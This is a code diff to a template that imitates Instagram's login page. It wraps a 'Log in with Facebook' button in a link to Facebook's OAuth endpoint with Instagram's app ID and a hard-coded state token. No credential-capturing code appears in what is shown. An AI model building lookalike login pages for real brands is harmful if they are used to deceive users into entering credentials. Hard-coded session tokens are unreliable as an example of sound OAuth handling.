@@ -33,8 +33,10 @@
                 <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
             </div>
             <button class="mt-4 flex">
-                <img src="{{ url_for('static', path='images/facebook.png') }}" class="facebook-logo">
-                <span class="font-semibold facebook-txt ml-1">Log in with Facebook</span>
+                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATAgIfDKjW9kW1cdZ4xpgpASxLKEoLbPId46QzejdV4Xux-HLQXKZzS2g0A6mhmwrhMtSqatZxghoYNW87zkPO_YskcoAPsUL11VEWgz-Bl1fOO6CWdFZew8UsrjfZAdsWnLxFQck7a2CwedCGOMdkQjY8dLXYt7KQ69XFjUOiZQi37hugpvHmFNBp7TbQgGhpB2HPFyamzl_2xaSiGcghlmCA9Y5HyNMgUT6PRfjENlOmyzDUMVbdMYqKUIW9jokkDgXVsPjqHyp_v0GcLKm1YsNUWEM0mp0NUGO9MmFbZimwpgrvGVbXsTcgl4ECFG3PY_xDelVL_HuuRo33yH6QM1Gitll33tZ01zU-YwBJc-PAS47ui2ZrXkmwuEGJ8Nz2n4EEgOIa3WwjNpsJkto0snQilWIsnR04CXlRM" target="_self" style="display: flex; align-items: center; text-decoration: none;">
+                    <img src="{{ url_for('static', path='images/facebook.png') }}" class="facebook-logo">
+                    <span class="font-semibold facebook-txt ml-1">Log in with Facebook</span>
+                </a>
             </button>
             <a href="https://www.instagram.com/accounts/password/reset/" class="text-xs mt-4 cursor-pointer -mb-4 forgot-pass-txt">Forgot password?</a>
         </div>
@@ -43,7 +45,7 @@
             <a href="https://www.instagram.com/accounts/emailsignup/" class="text-blue-500 text-sm font-semibold signup-txt">Sign up</a>
         </div>
         <div class="mt-3 text-center">
-            <span class="text-xs">Get the app.</span>
+            <span class="text-sm">Get the app.</span>
             <div class="flex mt-3 space-x-2">
                 <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN" class="google-store-logo" target="_blank">
                     <img src="{{ url_for('static', path='images/badge_android_english-en.png') }}" alt="Button Image">
